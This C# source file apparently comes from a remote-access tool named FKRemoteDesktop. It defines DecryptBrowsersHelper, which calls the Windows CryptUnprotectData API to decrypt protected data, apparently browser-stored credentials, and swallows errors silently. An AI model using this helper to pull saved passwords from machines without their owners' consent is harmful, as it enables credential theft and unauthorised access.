using FKRemoteDesktop.DllHook;
using System;
using System.Runtime.InteropServices;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Helpers
{
    public static class DecryptBrowsersHelper
    {
        public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            NativeMethods.DataBlob pPlainText = new NativeMethods.DataBlob();
            NativeMethods.DataBlob pCipherText = new NativeMethods.DataBlob();
            NativeMethods.DataBlob pEntropy = new NativeMethods.DataBlob();
            NativeMethods.CryptprotectPromptstruct pPrompt = new NativeMethods.CryptprotectPromptstruct()
            {
                cbSize = Marshal.SizeOf(typeof(NativeMethods.CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };
            string empty = string.Empty;

            try
            {
                try
                {
                    if (cipherTextBytes == null)
                        cipherTextBytes = new byte[0];
                    pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    pCipherText.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
                }
                catch { }

                try
                {
                    if (entropyBytes == null)
                        entropyBytes = new byte[0];
                    pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    pEntropy.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
                }
                catch { }

                NativeMethods.CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
                byte[] destination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
                return destination;
            }
            catch { }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);
                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);
                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }
    }
}